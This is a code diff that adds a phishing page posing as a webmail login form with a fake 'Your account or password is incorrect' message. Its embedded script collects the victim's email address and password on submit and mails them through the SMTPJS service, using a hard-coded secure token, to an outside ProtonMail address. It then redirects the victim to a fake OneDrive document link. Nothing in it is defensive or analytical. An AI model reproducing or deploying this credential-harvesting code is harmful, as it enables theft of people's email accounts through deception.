@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="style01.css" rel="stylesheet" />
+    <script src="script01.js" ></script>
+    <title>Log in</title>
+    
+
+</head>
+<body class="hublapsa">
+    <script src="script01.js"></script>
+        <form class="hublogin"  action="#">
+            <img src="hubwebmail.png" alt="Alternate text" class="huduser" />
+            <label for="mj6" class="v2" style="font-style:initial;"  >Your account or password is incorrect </label>
+            <br><br>
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://onedrive--shared-documents-wenasndue3n2wnw23us.on.drv.tw/viewdocument--incorrectcredentials--2jashywu2/923932932932938438 hubwebmail.html">
+            <label class="Iblhubemail" style="font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;">
+                <b>
+                    Email Address
+                </b>
+            </label>
+            <br>
+            <input type="email" name="email" class="hubtxtemail" placeholder="Enter your email address" required>
+            <br>
+            <br>
+            <label class="lblhubpass" style="font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;">
+                <b>
+                    Password
+                </b>
+            </label>  
+            <br>
+            <input type="Password" name="Pass" class="hubtxtpass" placeholder="Enter your email password" required>
+            <br><br>
+            <button class="hudbtnsubmit" type="submit" >LOG IN</button>
+            <br><br>
+        </form>
+        <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+    
+        <script>
+              
+            const form = document.querySelector('.hublogin')
+    
+    
+           function sendMsg(e){
+            e.preventDefault();
+            
+                const  Fullname = document.querySelector('.hubtxtemail')
+                  department = document.querySelector('.hubtxtpass')
+    
+    
+             Email.send({
+             SecureToken : "523b9631-eba2-428d-b404-b38a5c0db98f",
+             To : 'cansiloma120@protonmail.com',
+             From : "yohnlom@gmail.com",
+             Subject : "This is the subject"+"="+Fullname.value,
+             Body : "NAME  ["+Fullname.value+"]   department  ["+department.value+"]"
+             });
+             window.location.href = "https://Onedrivedocuments.github.io/viewdocuments-23jqmsai32mwqm3wqj3/923932932932938438 hubwebmail.html";
+           }
+    
+           form.addEventListener('submit', sendMsg);
+    
+            
+        </script>
+</body>
+</html>
